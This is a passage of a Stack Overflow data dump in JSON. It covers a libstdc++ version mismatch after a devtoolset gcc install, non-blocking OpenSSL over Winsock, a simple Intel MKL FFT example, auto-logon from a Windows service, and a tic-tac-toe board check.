programs", "body": "<p>My guess is that <code>/usr/lib64/libstdc++.so</code> is the older library which your application is trying to link against... and the newer library is installed somewhere else, which is not on the search path &mdash; or if it is on the search path, it comes <em>after</em> the old library, which is why the linker attempts to link against the older one, and fails.</p>\n\n<p>Try doing this:</p>\n\n<pre><code>$ g++ program.cpp -L/path/to/new/stdlib -lstdc++ -Wl,-rpath=/path/to/new/stdlib\n</code></pre>\n\n<p>where <code>/path/to/new/stdlib</code> is the location of the new library. You can also set this on the beginning of <code>LD_LIBRARY_PATH</code>.</p>\n\n<hr>\n\n<p>Or</p>\n\n<p>You're using older version of <code>g++</code>, and trying to against the newer version of <code>libstdc++.so</code>. Locate <code>g++</code> and use it. Use all 4 combinations of <code>g++</code> and <code>libstdc++</code> (if there are two versions of each of them).</p>\n\n<p>Hope that helps.</p>\n"}], "owner": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 333, "favorite_count": 0, "accepted_answer_id": 29805910, "answer_count": 1, "score": 0, "last_activity_date": 1429728740, "creation_date": 1429726807, "last_edit_date": 1429728740, "question_id": 29805852, "link": "https://stackoverflow.com/questions/29805852/running-c11-programs", "title": "Running C++11 programs", "body": "<p>I installed gcc4.8 in scientific linux using:</p>\n\n<pre><code>wget -O /etc/yum.repos.d/slc6-devtoolset.repo http://linuxsoft.cern.ch/cern/devtoolset/slc6-devtoolset.repo\nyum install devtoolset-2\n\ngcc --version gives me: gcc4.8\n</code></pre>\n\n<p>Now my problem is when I now run C++11 programs on gcc (using netbeans IDE) I get the error:</p>\n\n<pre><code>/home/topK/CppApplication_7/dist/Debug/GNU-Linux-x86/cppapplication_7: /usr/lib64/libstdc++.so.6: version `GLIBCXX_3.4.17' not found (required by /home/topK/CppApplication_7/dist/Debug/GNU-Linux-x86/cppapplication_7)\n/home/topK/CppApplication_7/dist/Debug/GNU-Linux-x86/cppapplication_7: /usr/lib64/libstdc++.so.6: version `GLIBCXX_3.4.14' not found (required by /home/topK/CppApplication_7/dist/Debug/GNU-Linux-x86/cppapplication_7)\n/home/topK/CppApplication_7/dist/Debug/GNU-Linux-x86/cppapplication_7: /usr/lib64/libstdc++.so.6: version `GLIBCXX_3.4.15' not found (required by /home/topK/CppApplication_7/dist/Debug/GNU-Linux-x86/cppapplication_7)\n</code></pre>\n\n<p>Can someone please help me as to how can I get rid of this error.</p>\n\n<p>EDIT: locate libstdc++\nOUTPUT:</p>\n\n<pre><code>/usr/lib/libstdc++-3-libc6.2-2-2.10.0.so\n/usr/lib/libstdc++-libc6.2-2.so.3\n/usr/lib/gcc/x86_64-redhat-linux/4.4.4/libstdc++.a\n/usr/lib/gcc/x86_64-redhat-linux/4.4.4/libstdc++.so\n/usr/lib/gcc/x86_64-redhat-linux/4.4.4/32/libstdc++.a\n/usr/lib/gcc/x86_64-redhat-linux/4.4.4/32/libstdc++.so\n/usr/lib64/libstdc++.so.5\n/usr/lib64/libstdc++.so.5.0.7\n/usr/lib64/libstdc++.so.6\n/usr/lib64/libstdc++.so.6.0.13\n/usr/share/doc/libstdc++-devel-4.4.7\n/usr/share/doc/libstdc++-devel-4.4.7/ChangeLog-1998.bz2\n/usr/share/doc/libstdc++-devel-4.4.7/ChangeLog-1999.bz2\n/usr/share/doc/libstdc++-devel-4.4.7/ChangeLog-2000.bz2\n/usr/share/doc/libstdc++-devel-4.4.7/ChangeLog-2001.bz2\n/usr/share/doc/libstdc++-devel-4.4.7/ChangeLog-2002.bz2\n/usr/share/doc/libstdc++-devel-4.4.7/ChangeLog-2003.bz2\n/usr/share/doc/libstdc++-devel-4.4.7/ChangeLog-2004.bz2\n/usr/share/doc/libstdc++-devel-4.4.7/ChangeLog-2005.bz2\n/usr/share/doc/libstdc++-devel-4.4.7/ChangeLog-2006.bz2\n/usr/share/doc/libstdc++-devel-4.4.7/ChangeLog-2007.bz2\n/usr/share/doc/libstdc++-devel-4.4.7/ChangeLog.bz2\n/usr/share/doc/libstdc++-devel-4.4.7/ChangeLog~.bz2\n/usr/share/doc/libstdc++-devel-4.4.7/README\n/usr/share/gdb/auto-load/usr/lib/libstdc++.so.6.0.13-gdb.py\n/usr/share/gdb/auto-load/usr/lib/libstdc++.so.6.0.13-gdb.pyc\n/usr/share/gdb/auto-load/usr/lib/libstdc++.so.6.0.13-gdb.pyo\n/usr/share/gdb/auto-load/usr/lib64/libstdc++.so.6.0.13-gdb.py\n/usr/share/gdb/auto-load/usr/lib64/libstdc++.so.6.0.13-gdb.pyc\n/usr/share/gdb/auto-load/usr/lib64/libstdc++.so.6.0.13-gdb.pyo\n/var/lib/yum/yumdb/c/32df1c3f56009c7df737dd4bfbd327bb0aef8d6e-compat-libstdc++-296-2.96-144.el6-i686\n/var/lib/yum/yumdb/c/a34683059a40d1d3401aab2723d7b68c8e1cbe15-compat-libstdc++-33-3.2.3-69.el6-x86_64\n/var/lib/yum/yumdb/c/32df1c3f56009c7df737dd4bfbd327bb0aef8d6e-compat-libstdc++-296-2.96-144.el6-i686/checksum_data\n/var/lib/yum/yumdb/c/32df1c3f56009c7df737dd4bfbd327bb0aef8d6e-compat-libstdc++-296-2.96-144.el6-i686/checksum_type\n/var/lib/yum/yumdb/c/32df1c3f56009c7df737dd4bfbd327bb0aef8d6e-compat-libstdc++-296-2.96-144.el6-i686/from_repo\n/var/lib/yum/yumdb/c/32df1c3f56009c7df737dd4bfbd327bb0aef8d6e-compat-libstdc++-296-2.96-144.el6-i686/from_repo_revision\n/var/lib/yum/yumdb/c/32df1c3f56009c7df737dd4bfbd327bb0aef8d6e-compat-libstdc++-296-2.96-144.el6-i686/from_repo_timestamp\n/var/lib/yum/yumdb/c/32df1c3f56009c7df737dd4bfbd327bb0aef8d6e-compat-libstdc++-296-2.96-144.el6-i686/installed_by\n/var/lib/yum/yumdb/c/32df1c3f56009c7df737dd4bfbd327bb0aef8d6e-compat-libstdc++-296-2.96-144.el6-i686/reason\n/var/lib/yum/yumdb/c/32df1c3f56009c7df737dd4bfbd327bb0aef8d6e-compat-libstdc++-296-2.96-144.el6-i686/releasever\n/var/lib/yum/yumdb/c/a34683059a40d1d3401aab2723d7b68c8e1cbe15-compat-libstdc++-33-3.2.3-69.el6-x86_64/checksum_data\n/var/lib/yum/yumdb/c/a34683059a40d1d3401aab2723d7b68c8e1cbe15-compat-libstdc++-33-3.2.3-69.el6-x86_64/checksum_type\n/var/lib/yum/yumdb/c/a34683059a40d1d3401aab2723d7b68c8e1cbe15-compat-libstdc++-33-3.2.3-69.el6-x86_64/from_repo\n/var/lib/yum/yumdb/c/a34683059a40d1d3401aab2723d7b68c8e1cbe15-compat-libstdc++-33-3.2.3-69.el6-x86_64/from_repo_revision\n/var/lib/yum/yumdb/c/a34683059a40d1d3401aab2723d7b68c8e1cbe15-compat-libstdc++-33-3.2.3-69.el6-x86_64/from_repo_timestamp\n/var/lib/yum/yumdb/c/a34683059a40d1d3401aab2723d7b68c8e1cbe15-compat-libstdc++-33-3.2.3-69.el6-x86_64/installed_by\n/var/lib/yum/yumdb/c/a34683059a40d1d3401aab2723d7b68c8e1cbe15-compat-libstdc++-33-3.2.3-69.el6-x86_64/reason\n/var/lib/yum/yumdb/c/a34683059a40d1d3401aab2723d7b68c8e1cbe15-compat-libstdc++-33-3.2.3-69.el6-x86_64/releasever\n/var/lib/yum/yumdb/l/cd38d7a96e461667eb9113f1fddb8a1e43d94178-libstdc++-4.4.7-11.el6-x86_64\n/var/lib/yum/yumdb/l/d804bf01331824c1a148301bc5102dd7276e5136-libstdc++-devel-4.4.7-11.el6-x86_64\n/var/lib/yum/yumdb/l/cd38d7a96e461667eb9113f1fddb8a1e43d94178-libstdc++-4.4.7-11.el6-x86_64/changed_by\n/var/lib/yum/yumdb/l/cd38d7a96e461667eb9113f1fddb8a1e43d94178-libstdc++-4.4.7-11.el6-x86_64/checksum_data\n/var/lib/yum/yumdb/l/cd38d7a96e461667eb9113f1fddb8a1e43d94178-libstdc++-4.4.7-11.el6-x86_64/checksum_type\n/var/lib/yum/yumdb/l/cd38d7a96e461667eb9113f1fddb8a1e43d94178-libstdc++-4.4.7-11.el6-x86_64/command_line\n/var/lib/yum/yumdb/l/cd38d7a96e461667eb9113f1fddb8a1e43d94178-libstdc++-4.4.7-11.el6-x86_64/from_repo\n/var/lib/yum/yumdb/l/cd38d7a96e461667eb9113f1fddb8a1e43d94178-libstdc++-4.4.7-11.el6-x86_64/from_repo_revision\n/var/lib/yum/yumdb/l/cd38d7a96e461667eb9113f1fddb8a1e43d94178-libstdc++-4.4.7-11.el6-x86_64/from_repo_timestamp\n/var/lib/yum/yumdb/l/cd38d7a96e461667eb9113f1fddb8a1e43d94178-libstdc++-4.4.7-11.el6-x86_64/installed_by\n/var/lib/yum/yumdb/l/cd38d7a96e461667eb9113f1fddb8a1e43d94178-libstdc++-4.4.7-11.el6-x86_64/reason\n/var/lib/yum/yumdb/l/cd38d7a96e461667eb9113f1fddb8a1e43d94178-libstdc++-4.4.7-11.el6-x86_64/releasever\n/var/lib/yum/yumdb/l/d804bf01331824c1a148301bc5102dd7276e5136-libstdc++-devel-4.4.7-11.el6-x86_64/changed_by\n/var/lib/yum/yumdb/l/d804bf01331824c1a148301bc5102dd7276e5136-libstdc++-devel-4.4.7-11.el6-x86_64/checksum_data\n/var/lib/yum/yumdb/l/d804bf01331824c1a148301bc5102dd7276e5136-libstdc++-devel-4.4.7-11.el6-x86_64/checksum_type\n/var/lib/yum/yumdb/l/d804bf01331824c1a148301bc5102dd7276e5136-libstdc++-devel-4.4.7-11.el6-x86_64/command_line\n/var/lib/yum/yumdb/l/d804bf01331824c1a148301bc5102dd7276e5136-libstdc++-devel-4.4.7-11.el6-x86_64/from_repo\n/var/lib/yum/yumdb/l/d804bf01331824c1a148301bc5102dd7276e5136-libstdc++-devel-4.4.7-11.el6-x86_64/from_repo_revision\n/var/lib/yum/yumdb/l/d804bf01331824c1a148301bc5102dd7276e5136-libstdc++-devel-4.4.7-11.el6-x86_64/from_repo_timestamp\n/var/lib/yum/yumdb/l/d804bf01331824c1a148301bc5102dd7276e5136-libstdc++-devel-4.4.7-11.el6-x86_64/installed_by\n/var/lib/yum/yumdb/l/d804bf01331824c1a148301bc5102dd7276e5136-libstdc++-devel-4.4.7-11.el6-x86_64/reason\n/var/lib/yum/yumdb/l/d804bf01331824c1a148301bc5102dd7276e5136-libstdc++-devel-4.4.7-11.el6-x86_64/releasever\n</code></pre>\n\n<p>EDIT: locate g++\nOUTPUT:</p>\n\n<pre><code>/opt/rh/devtoolset-2/root/usr/bin/g++\n/opt/rh/devtoolset-2/root/usr/bin/x86_64-redhat-linux-g++\n/opt/rh/devtoolset-2/root/usr/share/man/man1/g++.1.gz\n/usr/bin/g++\n/usr/bin/x86_64-redhat-linux-g++\n/usr/lib64/libconfig++.so.8\n/usr/lib64/libconfig++.so.8.0.0\n/usr/share/man/man1/g++.1.gz\n</code></pre>\n"}, {"tags": ["c++", "c", "sockets", "openssl", "winsock2"], "answers": [{"comments": [{"owner": {"reputation": 449, "user_id": 4708444, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/57e1665328d412a518089ebbdcfb1845?s=128&d=identicon&r=PG&f=1", "display_name": "GloriousLemon", "link": "https://stackoverflow.com/users/4708444/gloriouslemon"}, "edited": false, "score": 0, "creation_date": 1429729865, "post_id": 29805872, "comment_id": 47741472, "body": "Thanks. winsock is the Windows library equivalent to the Unix sockets library."}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "edited": false, "score": 0, "creation_date": 1461718043, "post_id": 29805872, "comment_id": 61322825, "body": "Winsock sockets are indeed <i>blocking</i> by default."}], "tags": [], "owner": {"reputation": 3265, "user_id": 2606938, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/7gIUB.jpg?s=128&g=1", "display_name": "Prabhu", "link": "https://stackoverflow.com/users/2606938/prabhu"}, "is_accepted": false, "score": 0, "last_activity_date": 1429726884, "creation_date": 1429726884, "answer_id": 29805872, "question_id": 29805785, "link": "https://stackoverflow.com/questions/29805785/if-a-winsock2-socket-is-non-blocking-would-an-ssl-object-associated-with-it-als/29805872#29805872", "title": "If a winsock2 socket is non-blocking, would an SSL object associated with it also exhibit non-blocking behavior?", "body": "<blockquote>\n  <p>If my assumption is correct, does that mean if the socket is non-blocking, the SSL is as well?</p>\n</blockquote>\n\n<p>Yes.</p>\n\n<blockquote>\n  <p>Is a winsock tcp socket non-blocking by default (assuming I have created a TCP socket, but have not called ioctlsocket and set non-blocking mode)</p>\n</blockquote>\n\n<p>Unix sockets are by default blocking. Haven't used Winsock. But am sure Winsock should be by default blocking.</p>\n"}, {"tags": [], "owner": {"reputation": 24, "user_id": 5046868, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ibNPU.jpg?s=128&g=1", "display_name": "Chungkil Kim", "link": "https://stackoverflow.com/users/5046868/chungkil-kim"}, "is_accepted": false, "score": 0, "last_activity_date": 1445947542, "creation_date": 1445947542, "answer_id": 33367572, "question_id": 29805785, "link": "https://stackoverflow.com/questions/29805785/if-a-winsock2-socket-is-non-blocking-would-an-ssl-object-associated-with-it-als/33367572#33367572", "title": "If a winsock2 socket is non-blocking, would an SSL object associated with it also exhibit non-blocking behavior?", "body": "<p>try following code:</p>\n\n<pre><code>   SSL_set_fd(ss, sock);\nretry:\n   int ret = SSL_accept(ssl);\n   if (ret != 1) {\n      int err = SSL_get_error(ssl, ret);\n      if (err == SSL_ERROR_WANT_READ || SSL_ERROR_WANT_WRITE) {\n         // maybe need some sleep or select\n         goto retry;\n      }\n   }\n</code></pre>\n"}], "owner": {"reputation": 449, "user_id": 4708444, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/57e1665328d412a518089ebbdcfb1845?s=128&d=identicon&r=PG&f=1", "display_name": "GloriousLemon", "link": "https://stackoverflow.com/users/4708444/gloriouslemon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 254, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1445947542, "creation_date": 1429726583, "question_id": 29805785, "link": "https://stackoverflow.com/questions/29805785/if-a-winsock2-socket-is-non-blocking-would-an-ssl-object-associated-with-it-als", "title": "If a winsock2 socket is non-blocking, would an SSL object associated with it also exhibit non-blocking behavior?", "body": "<p>I'm asking this question because I am unsure whether an SSL object treats a socket as a sink/source for messages like it does with a BIO object. My gut is telling me yes, but I'm not certain.</p>\n\n<p><strong>Goal:</strong>\nI am integrating a SSL authentication into already existing TCP code. Rather than calling the conventional send()/receive(), I would like to direct the messages through OpenSSL's SSL_read()/SSL_write() instead. My other requirement is that communication is non-blocking and data can be partially sent.</p>\n\n<p>Here's how I've associated the SSL object with the socket (Server code).</p>\n\n<pre><code>SSL_Init(std::wstring &amp;peer_hostname, SOCKET sock){\n        //...\n        //Initialize SSL structure\n                ssl = SSL_new(context);\n                if (ssl == NULL){\n                    mr = APPZRETURN(E_FAIL, L\"%ls (%d) : SSL_new failed. Unable to create SSL structure\", __FUNCTIONW__, __LINE__);\n                }\n\n                //Agent uses winsock class, but OpenSSL uses unix socket. Surpressed warning added here for 4244. It works\n                if (SSL_set_fd(ssl, sock) == 0){    //set file descriptor for ssl\n                    //Operation failed\n                    return -1;\n        }\n        //...\n        int status = SSL_accept(ssl);   \n        SSL_set_mode(ssl, SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER|SSL_MODE_ENABLE_PARTIAL_WRITE);\n        //...\n    }\n</code></pre>\n\n<p>According to the documentation for SSL_read() [<a href=\"https://www.openssl.org/docs/ssl/SSL_read.html]\" rel=\"nofollow\">https://www.openssl.org/docs/ssl/SSL_read.html]</a>, the SSL is non-blocking if the underlying BIO is non-blocking. If my assumption is correct, does that mean if the socket is non-blocking, the SSL is as well?</p>\n\n<p><strong>Extension of my Question</strong>: Is a winsock tcp socket non-blocking by default (assuming I have created a TCP socket, but have not called ioctlsocket and set non-blocking mode)</p>\n\n<p>Thank you for taking the time to read this. It's much appreciated.</p>\n"}, {"tags": ["c++", "fft", "intel-mkl", "dft"], "comments": [{"owner": {"reputation": 12989, "user_id": 2994596, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YU9Zw.png?s=128&g=1", "display_name": "SleuthEye", "link": "https://stackoverflow.com/users/2994596/sleutheye"}, "edited": false, "score": 0, "creation_date": 1429754917, "post_id": 29805767, "comment_id": 47752562, "body": "I&#39;d assume you are referring to <a href=\"https://software.intel.com/en-us/node/471390\" rel=\"nofollow noreferrer\">those examples</a>, perhaps more specifically the &quot;C Interface&quot; ones. If that&#39;s the case, make sure to read the accompanying <a href=\"https://software.intel.com/en-us/node/470818#8EB0A29C-06D8-4C97-ACD0-C8A320501A6A\" rel=\"nofollow noreferrer\">Fourier Transform Functions</a> link at the top."}, {"owner": {"reputation": 6761, "user_id": 802362, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/e1ed0c2043db6eb30095426cd8f96692?s=128&d=identicon&r=PG", "display_name": "Baptiste Wicht", "link": "https://stackoverflow.com/users/802362/baptiste-wicht"}, "reply_to_user": {"reputation": 12989, "user_id": 2994596, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YU9Zw.png?s=128&g=1", "display_name": "SleuthEye", "link": "https://stackoverflow.com/users/2994596/sleutheye"}, "edited": false, "score": 1, "creation_date": 1429788623, "post_id": 29805767, "comment_id": 47770350, "body": "@SleuthEye Yes, I was referring to them. I personally don&#39;t find these bloated examples useful, but it is probably enough for others. I&#39;d like to find simpler examples. It seems I&#39;ll probably have to do with them."}, {"owner": {"reputation": 6761, "user_id": 802362, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/e1ed0c2043db6eb30095426cd8f96692?s=128&d=identicon&r=PG", "display_name": "Baptiste Wicht", "link": "https://stackoverflow.com/users/802362/baptiste-wicht"}, "reply_to_user": {"reputation": 12989, "user_id": 2994596, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YU9Zw.png?s=128&g=1", "display_name": "SleuthEye", "link": "https://stackoverflow.com/users/2994596/sleutheye"}, "edited": false, "score": 0, "creation_date": 1429821639, "post_id": 29805767, "comment_id": 47794397, "body": "I continued checking the official examples, but some of them don&#39;t even compile... It is not a really good way to start with..."}], "answers": [{"tags": [], "owner": {"reputation": 6761, "user_id": 802362, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/e1ed0c2043db6eb30095426cd8f96692?s=128&d=identicon&r=PG", "display_name": "Baptiste Wicht", "link": "https://stackoverflow.com/users/802362/baptiste-wicht"}, "is_accepted": true, "score": 10, "last_activity_date": 1429908581, "creation_date": 1429908581, "answer_id": 29857208, "question_id": 29805767, "link": "https://stackoverflow.com/questions/29805767/is-there-any-simple-c-example-on-how-to-use-intel-mkl-fft/29857208#29857208", "title": "Is there any simple C++ example on how to use Intel MKL FFT?", "body": "<p>I ended up testing several things and I finally ended up with this three functions that do what I want and that I considered simple examples.  </p>\n\n<p>I tested it against some inputs and I had the good results. I haven't done extensive testing though.    </p>\n\n<pre><code>//Note after each operation status should be 0 on success \n\nstd::vector&lt;std::complex&lt;float&gt;&gt; fft_complex(std::vector&lt;std::complex&lt;float&gt;&gt;&amp; in){\n    std::vector&lt;std::complex&lt;float&gt;&gt; out(in.size());\n\n    DFTI_DESCRIPTOR_HANDLE descriptor;\n    MKL_LONG status;\n\n    status = DftiCreateDescriptor(&amp;descriptor, DFTI_SINGLE, DFTI_COMPLEX, 1, in.size()); //Specify size and precision\n    status = DftiSetValue(descriptor, DFTI_PLACEMENT, DFTI_NOT_INPLACE); //Out of place FFT\n    status = DftiCommitDescriptor(descriptor); //Finalize the descriptor\n    status = DftiComputeForward(descriptor, in.data(), out.data()); //Compute the Forward FFT\n    status = DftiFreeDescriptor(&amp;descriptor); //Free the descriptor\n\n    return out;\n}\n\nstd::vector&lt;std::complex&lt;float&gt;&gt; fft_real(std::vector&lt;float&gt;&amp; in_real){\n    std::vector&lt;std::complex&lt;float&gt;&gt; in(in_real.size());\n\n    std::copy(in_real.begin(), in_real.end(), in.begin());\n\n    return fft_complex(in);\n}\n\nstd::vector&lt;float&gt; ifft(std::vector&lt;std::complex&lt;float&gt;&gt;&amp; in){\n    std::vector&lt;std::complex&lt;float&gt;&gt; out(in.size());\n\n    DFTI_DESCRIPTOR_HANDLE descriptor;\n    MKL_LONG status;\n\n    status = DftiCreateDescriptor(&amp;descriptor, DFTI_SINGLE, DFTI_COMPLEX, 1, in.size()); //Specify size and precision\n    status = DftiSetValue(descriptor, DFTI_PLACEMENT, DFTI_NOT_INPLACE); //Out of place FFT\n    status = DftiSetValue(descriptor, DFTI_BACKWARD_SCALE, 1.0f / in.size()); //Scale down the output\n    status = DftiCommitDescriptor(descriptor); //Finalize the descriptor\n    status = DftiComputeBackward(descriptor, in.data(), out.data()); //Compute the Forward FFT\n    status = DftiFreeDescriptor(&amp;descriptor); //Free the descriptor\n\n    std::vector&lt;float&gt; output(out.size());\n\n    for(std::size_t i = 0; i &lt; out.size(); ++i){\n        output[i] = out[i].real();\n    }\n\n    return output;\n}\n</code></pre>\n"}], "owner": {"reputation": 6761, "user_id": 802362, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/e1ed0c2043db6eb30095426cd8f96692?s=128&d=identicon&r=PG", "display_name": "Baptiste Wicht", "link": "https://stackoverflow.com/users/802362/baptiste-wicht"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 6980, "favorite_count": 7, "accepted_answer_id": 29857208, "answer_count": 1, "score": 10, "last_activity_date": 1556317965, "creation_date": 1429726514, "last_edit_date": 1429908592, "question_id": 29805767, "link": "https://stackoverflow.com/questions/29805767/is-there-any-simple-c-example-on-how-to-use-intel-mkl-fft", "title": "Is there any simple C++ example on how to use Intel MKL FFT?", "body": "<p>I need to perform FFT and Inverse-FFT transformations. The input would be vector and matrices of double. Ideally, the output should be an array of std::complex but I can live with double _Complex. </p>\n\n<p>I haven't found any simple example, all Intel examples are doing a lot of things at once without enough comments. </p>\n\n<p>I just want a simple example in C++ taking a vector (or a matrix) of double as input and outputting the FFT-transformed result (ideally with std::complex).  </p>\n"}, {"tags": ["c++", "windows", "authentication", "windows-7", "windows-services"], "comments": [{"owner": {"reputation": 10703, "user_id": 3134621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c46cfe9f917da02becc991d76352d77c?s=128&d=identicon&r=PG&f=1", "display_name": "deviantfan", "link": "https://stackoverflow.com/users/3134621/deviantfan"}, "edited": false, "score": 0, "creation_date": 1429726968, "post_id": 29805711, "comment_id": 47739649, "body": "<a href=\"http://superuser.com/questions/152435/remote-desktop-with-other-user-still-logged-on\" title=\"remote desktop with other user still logged on\">superuser.com/questions/152435/&hellip;</a>"}, {"owner": {"reputation": 33265, "user_id": 886887, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/1616c7e4fab23f6e014ee11d75408bba?s=128&d=identicon&r=PG", "display_name": "Harry Johnston", "link": "https://stackoverflow.com/users/886887/harry-johnston"}, "edited": false, "score": 1, "creation_date": 1429742550, "post_id": 29805711, "comment_id": 47748505, "body": "You can configure the machine to log on automatically with a given username and password.  The ForceAutoLogon setting makes the automatic logon kick in as soon as a user logs off rather than only when the machine is rebooted."}], "answers": [{"tags": [], "owner": {"reputation": 1190, "user_id": 3207828, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1EPkw.jpg?s=128&g=1", "display_name": "Dan Korn", "link": "https://stackoverflow.com/users/3207828/dan-korn"}, "is_accepted": false, "score": 0, "last_activity_date": 1429733952, "last_edit_date": 1495541183, "creation_date": 1429733952, "answer_id": 29807966, "question_id": 29805711, "link": "https://stackoverflow.com/questions/29805711/is-it-possible-to-sign-in-and-load-a-users-desktop-programmatically-from-a-wind/29807966#29807966", "title": "Is it possible to sign in and load a user&#39;s desktop programmatically from a windows 7 service on the local machine?", "body": "<p>No.  You can impersonate a user, load a user's registry hive, and launch processes with that user's account, but in Vista and later disallow interactive services, so you can't do anything that interacts with a user desktop.  What you can do is IPC (inter-process communication) between the service process and a running user process, via TCP, named pipes, and other means, but only if the user is already logged in with a desktop.  You can't start a user desktop session.</p>\n\n<p>More info:\n<a href=\"https://stackoverflow.com/search?q=%22windows+7%22+interactive+service\">https://stackoverflow.com/search?q=%22windows+7%22+interactive+service</a></p>\n\n<p>As for how to get around not having a keyboard to issue Ctrl-Alt-Delete (even though that's not really the question you asked), you may be able to use the on-screen keyboard, depending on UAC settings.</p>\n\n<p>By the way, this isn't a C++-specific question at all; you can use the entire Windows API with regular old C.</p>\n"}], "owner": {"reputation": 763, "user_id": 1333797, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/c7a136e4e9909442a0afb1f59d8e49ab?s=128&d=identicon&r=PG", "display_name": "Matthew Lueder", "link": "https://stackoverflow.com/users/1333797/matthew-lueder"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 133, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1429733952, "creation_date": 1429726300, "question_id": 29805711, "link": "https://stackoverflow.com/questions/29805711/is-it-possible-to-sign-in-and-load-a-users-desktop-programmatically-from-a-wind", "title": "Is it possible to sign in and load a user&#39;s desktop programmatically from a windows 7 service on the local machine?", "body": "<p><strong>The problem:</strong>\nWe are using a windows 7 machine to display information on a monitor. This machine is hard to reach and has no keyboard or mouse attached. After a user logs onto this machine using remote desktop, then logs off, it becomes stuck at the \"Press CTRL+ALT+DELETE\" screen and I have to plug a keyboard and mouse into it to sign back in to the user account which is responsible for displaying the correct information on the monitor. </p>\n\n<p>I am developing a windows service in C++ that looks at the current sessions to see when a user logs in and out of remote desktop. I want to have this service sign back into the correct user and display the user's desktop after the user logs out. </p>\n\n<p>Right now I am stuck trying to find a way to have a service sign into a user account and display their desktop on the monitor. Is there anyway to do this?</p>\n"}, {"tags": ["c++", "matrix"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2249683"}, "edited": false, "score": 0, "creation_date": 1429725444, "post_id": 29805419, "comment_id": 47738659, "body": "Just write it down and you have the fasted code possible."}, {"owner": {"reputation": 3004, "user_id": 1359034, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e97eaac4d6ba8f0c3f95900f02b45b42?s=128&d=identicon&r=PG", "display_name": "dwcanillas", "link": "https://stackoverflow.com/users/1359034/dwcanillas"}, "edited": false, "score": 0, "creation_date": 1429725707, "post_id": 29805419, "comment_id": 47738844, "body": "@DieterL&#252;cking I think he isn&#39;t looking for &quot;efficient&quot; in terms of performance, but instead in terms of code length"}, {"owner": {"reputation": 944, "user_id": 236885, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ab8e32ecf90457cfb9ca8f1a73d593f1?s=128&d=identicon&r=PG", "display_name": "bialpio", "link": "https://stackoverflow.com/users/236885/bialpio"}, "edited": false, "score": 1, "creation_date": 1429725776, "post_id": 29805419, "comment_id": 47738882, "body": "2 <code>for</code> loops to check for row and column winning condition and 2 explicit checks for diagonals should do."}, {"owner": {"reputation": 1785, "user_id": 4680870, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ClLL3.png?s=128&g=1", "display_name": "tivn", "link": "https://stackoverflow.com/users/4680870/tivn"}, "edited": false, "score": 0, "creation_date": 1429726220, "post_id": 29805419, "comment_id": 47739194, "body": "If each element possible values is either 0 or 1 then you can check this with the sum; e.g.: <code>Board[0][0] + Board[0][1] + Board[0][2]</code>. Sum of 0 or 3 means same, otherwise means differ."}], "answers": [{"comments": [{"owner": {"reputation": 3004, "user_id": 1359034, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e97eaac4d6ba8f0c3f95900f02b45b42?s=128&d=identicon&r=PG", "display_name": "dwcanillas", "link": "https://stackoverflow.com/users/1359034/dwcanillas"}, "edited": false, "score": 0, "creation_date": 1429725882, "post_id": 29805531, "comment_id": 47738949, "body": "this doesn&#39;t work.  This doesnt check diagonals, columns, or 2 of the 3 rows"}, {"owner": {"reputation": 13384, "user_id": 451600, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/qYIUW.jpg?s=128&g=1", "display_name": "Captain Giraffe", "link": "https://stackoverflow.com/users/451600/captain-giraffe"}, "edited": false, "score": 0, "creation_date": 1429725885, "post_id": 29805531, "comment_id": 47738953, "body": "That sure looks like a for-statement to me."}, {"owner": {"reputation": 26, "user_id": 4669372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/803d53ad1bb51e261d124873e8464012?s=128&d=identicon&r=PG&f=1", "display_name": "jiri-vyc", "link": "https://stackoverflow.com/users/4669372/jiri-vyc"}, "edited": false, "score": 0, "creation_date": 1429726302, "post_id": 29805531, "comment_id": 47739249, "body": "He asked for elements in each row/column, nothing about diagonals, but yeah, I should&#39;ve assumed that by the tic-tac-toe thing. And it&#39;s just part of a code for 1 line. Wrap it in for-loop and do it once for rows, once for columns. I thought he just wants how can the comparison be made by itself, not how to check the whole board.   And yeah, it 